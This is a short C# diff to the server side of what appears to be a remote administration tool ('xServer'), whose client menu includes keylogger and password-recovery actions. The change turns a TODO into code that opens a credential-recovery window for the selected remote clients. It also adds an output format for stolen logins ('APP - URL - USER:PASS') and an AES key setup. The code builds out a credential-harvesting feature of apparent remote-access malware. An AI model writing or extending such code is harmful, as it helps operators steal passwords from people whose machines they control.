@@ -5,6 +5,7 @@ using System.Linq;
 using System.Threading;
 using System.Windows.Forms;
 using xServer.Core.Commands;
+using xServer.Core.Encryption;
 using xServer.Enums;
 using xServer.Core.Helper;
 using xServer.Core.Networking;
@@ -36,6 +37,7 @@ namespace xServer.Forms
             XMLSettings.AutoListen = bool.Parse(XMLSettings.ReadValue("AutoListen"));
             XMLSettings.ShowPopup = bool.Parse(XMLSettings.ReadValue("ShowPopup"));
             XMLSettings.UseUPnP = bool.Parse(XMLSettings.ReadValue("UseUPnP"));
+            XMLSettings.SaveFormat = XMLSettings.ReadValueSafe("SaveFormat", "APP - URL - USER:PASS");
 
             XMLSettings.ShowToolTip = bool.Parse(XMLSettings.ReadValueSafe("ShowToolTip", "False"));
             XMLSettings.IntegrateNoIP = bool.Parse(XMLSettings.ReadValueSafe("EnableNoIPUpdater", "False"));
@@ -63,7 +65,7 @@ namespace xServer.Forms
             Instance = this;
 
             ReadSettings();
-
+            AES.PreHashKey(XMLSettings.Password);
 #if !DEBUG
             ShowTermsOfService(XMLSettings.ShowToU);
 #endif
@@ -625,7 +627,11 @@ namespace xServer.Forms
 
         private void ctxtPasswordRecovery_Click(object sender, EventArgs e)
         {
-            // TODO
+            if (lstClients.SelectedItems.Count != 0)
+            {
+                FrmPasswordRecovery frmPass = new FrmPasswordRecovery(GetSelectedClients().ToList());
+                frmPass.Show();
+            }
         }
 
         private void ctxtKeylogger_Click(object sender, EventArgs e)
